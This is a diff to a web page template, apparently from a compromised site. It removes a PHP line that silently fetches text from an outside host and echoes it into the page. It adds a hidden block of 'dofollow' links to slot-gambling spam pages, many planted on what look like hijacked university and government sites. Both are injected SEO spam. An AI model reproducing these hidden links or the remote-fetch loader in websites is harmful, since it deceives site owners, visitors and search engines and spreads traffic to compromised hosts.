@@ -172,8 +172,26 @@ var astx_add_link_copied_text = {"readmore":"","addlinktosite":"","addsitename":
 
 	@yield('page_plugins')
 
-<?php $ch = curl_init();curl_setopt($ch, CURLOPT_URL, "https://ngeback.link/ar.txt");curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$output = curl_exec($ch);curl_close($ch);echo $output;?>
+<div style="display:none;">
+<p><a title="Slot Pulsa" href="http://cc87912-drupal-7.tw1.ru/public/journals/slot-pulsa/" rel="dofollow">http://cc87912-drupal-7.tw1.ru/public/journals/slot-pulsa/</a></p>
+<p><a title="Slot Online" href="http://revistaeolo.fconvida.org/templates/images/slot-online/" rel="dofollow">http://revistaeolo.fconvida.org/templates/images/slot-online/</a></p>
+<p><a title="Slot Gacor 2022" href="http://revista.ispsn.org/ojs/slot-gacor/" rel="dofollow">http://revista.ispsn.org/ojs/slot-gacor/</a></p>
+<p><a title="Slot Deposit Pulsa" href="https://prosecutioncmms.kp.gov.pk/slot-pulsa/" rel="dofollow">https://prosecutioncmms.kp.gov.pk/slot-pulsa/</a></p>
+<p><a title="Slot Online Terpercaya" href="http://interactome.dfci.harvard.edu/fragdb/cgi-bin/judi-slot-online/" rel="dofollow">http://interactome.dfci.harvard.edu/fragdb/cgi-bin/judi-slot-online/</a></p>
+<p><a title="Rtp Slot" href="https://lolly.comc.co.il/" rel="dofollow">https://lolly.comc.co.il/</a></p>
+<p><a title="Slot Demo" href="https://wp01.fpe.zcu.cz/wp-includes/slot-demo/" rel="dofollow">https://wp01.fpe.zcu.cz/wp-includes/slot-demo/</a></p>
+<p><a title="Slot Gacor Hari Ini" href="https://ciae.icar.gov.in/vendor/-/slot-gacor/" rel="dofollow">https://ciae.icar.gov.in/vendor/-/slot-gacor/</a></p>
+<p><a title="situs slot gacor" href="https://trang.lib.ru.ac.th/slot-gacor/" rel="dofollow">https://trang.lib.ru.ac.th/slot-gacor/</a></p>
+<p><a title="jam rtp slot" href="https://careers.mahidol.ac.th/rtp-slot/" rel="dofollow">https://careers.mahidol.ac.th/rtp-slot/</a></p>
+<p><a title="Slot Pulsa Tanpa Potongan" href="https://www.jaotipe.hku.hk/slot/" rel="dofollow">https://www.jaotipe.hku.hk/slot/</a></p>
+<p><a title="Link Slot Gacor" href="https://novosite.fsh.edu.br/wp-includes/assets/slot-gacor/" rel="dofollow">https://novosite.fsh.edu.br/wp-includes/assets/slot-gacor/</a></p>
+<p><a title="bocoran slot gacor hari ini" href="https://nip.qau.edu.pk/wp/.tmb/slot-gacor/" rel="dofollow">https://nip.qau.edu.pk/wp/.tmb/slot-gacor/</a></p>
+<p><a title="slot via pulsa" href="http://adversus.org/revista/files/journals/slot-pulsa/" rel="dofollow">http://adversus.org/revista/files/journals/slot-pulsa/</a></p>
+<p><a title="slot gacor 4d" href="https://career.perumnas.co.id/assets/4d/" rel="dofollow">https://career.perumnas.co.id/assets/4d/</a></p>
+<p><a title="slot dana" href="https://rumah.perumnas.co.id/template/slot-dana/" rel="dofollow">https://rumah.perumnas.co.id/template/slot-dana/</a></p>
+<p><a title="slot gacor" href="https://perumnas.co.id/ninja-slot-88-gacor-4d/" rel="dofollow">https://perumnas.co.id/ninja-slot-88-gacor-4d/</a></p>
 
+</div>
 </body>
 
 </html>
